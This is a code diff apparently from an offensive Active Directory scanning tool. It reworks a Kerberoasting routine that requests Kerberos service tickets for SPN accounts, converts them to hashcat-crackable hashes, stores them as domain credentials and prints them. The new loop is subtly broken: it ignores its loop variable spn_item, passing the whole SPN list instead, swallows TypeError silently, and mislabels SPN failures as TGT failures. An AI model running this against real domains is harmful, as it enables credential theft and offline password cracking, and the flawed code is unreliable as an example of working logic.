@@ -713,7 +713,7 @@ def adscan_worker(target, actions, creds, ldap_protocol, python_ldap, timeout):
                                 })
                                 Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (user.ljust(30), ",".join(entry['spns']))})
 
-                                spn = entry['spns'][0]
+                                spn = entry['spns']
                                 username = entry['username'][:-1] if entry['username'].endswith('$') else entry['username']
                             else:
                                 spn = user_spn
@@ -729,22 +729,33 @@ def adscan_worker(target, actions, creds, ldap_protocol, python_ldap, timeout):
                                     Output.error({'target': ldapscan.url(), 'message': 'SPN not found'})
 
                             if spn != None:
-                                TGS = kerberos.getTGS(spn, TGT)
+                                if type(spn) == str:
+                                    spn = [spn]
 
-                                output = kerberos.TGStoHashcat(TGS, username, spn)
+                                for spn_item in spn:
+                                    try:
+                                        TGS = kerberos.getTGS(spn, TGT)
 
-                                cred_info = {
-                                    'domain': entry['domain'],
-                                    'username': entry['username'],
-                                    'type': 'hash',
-                                    'format': 'krb5tgs',
-                                    'hash': output['tgs'],
-                                }
-                                DB.insert_domain_credential(cred_info)
+                                        output = kerberos.TGStoHashcat(TGS, username, spn)
 
-                                Output.vuln({'target': smbscan.url(), 'message': '- %s  (Kerberoasting)\n%s' % (user.ljust(50), output['tgs'])})
-                    else:
-                        Output.error({'target': smbscan.url(), 'message': 'Failed to get your TGT'})
+                                        cred_info = {
+                                            'domain': entry['domain'],
+                                            'username': entry['username'],
+                                            'type': 'hash',
+                                            'format': 'krb5tgs',
+                                            'hash': output['tgs'],
+                                        }
+                                        DB.insert_domain_credential(cred_info)
+
+                                        Output.vuln({'target': smbscan.url(), 'message': '- %s  (Kerberoasting)\n%s' % (user.ljust(50), output['tgs'])})
+
+                                        break
+                                    except TypeError:
+                                            continue
+                                else:
+                                    Output.error({'target': smbscan.url(), 'message': 'Failed to get your TGT'})
+                        else:
+                            Output.error({'target': smbscan.url(), 'message': 'Failed to get your TGT'})
 
                 else:
                     raise NotImplementedError('Dumping users through SMB')
